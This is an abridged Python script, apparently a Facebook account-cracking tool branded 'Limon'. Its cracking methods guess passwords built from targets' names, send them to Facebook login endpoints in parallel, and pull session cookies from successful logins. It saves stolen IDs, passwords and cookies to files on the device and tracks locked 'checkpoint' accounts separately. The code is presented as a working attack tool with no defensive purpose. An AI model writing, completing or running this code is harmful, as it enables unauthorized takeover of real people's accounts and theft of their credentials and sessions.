...
from concurrent.futures import ThreadPoolExecutor as sarfrazLimon
from string import * 
...
logo =                                          """            
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m \x1b[38;5;46m  | |    (_)                      
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m \x1b[38;5;47m  | |     _ _ __ ___   ___  _ __
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m \x1b[38;5;48m  | |    | | '_ ` _ \ / _ \| '_ \\033[1;91m
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m \x1b[38;5;49m  | |____| | | | | | | (_) | | | |\033[1;91m
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m \x1b[38;5;50m  |______|_|_| |_| |_|\___/|_| |_|\033[1;91m
\033[1;37m------------------------------------------------
\033[1;37m Owner   :     MD Limon 
\033[1;37m Facebook:     L_S Brother
\033[1;37m Github  :     Limon bro
\033[1;37m Version :     V.99
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back Limon ")
        exit()
...
def sarfraz():   
    ...
    if select =='1':
       ...
       #cutter()
    #elif select =='W':
        #os.system('xdg-open 01519602135')
        #pass
    #elif select =='F':
        #os.system('xdg-open https://facebook.com/pinik.mahid.001')
    #else:
        print('\n Select valid option ... ')
        time.sleep(2)
        Limon(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Limon] {loop} | M•1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Limonb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Limonb};{ckkk}"
                    print(f'\r\033[10;92m\033[1;91m[\033[1;92mLimon-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mUSER\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[🍪]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                    oks.append(sid)
                    open('/sdcard/Limon.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Limon_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Limon] {loop} | M•3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    oks.append(sid)
                    open('/sdcard/Limon.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Limon_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{A} [Limon-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Limon] {loop} | M•2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
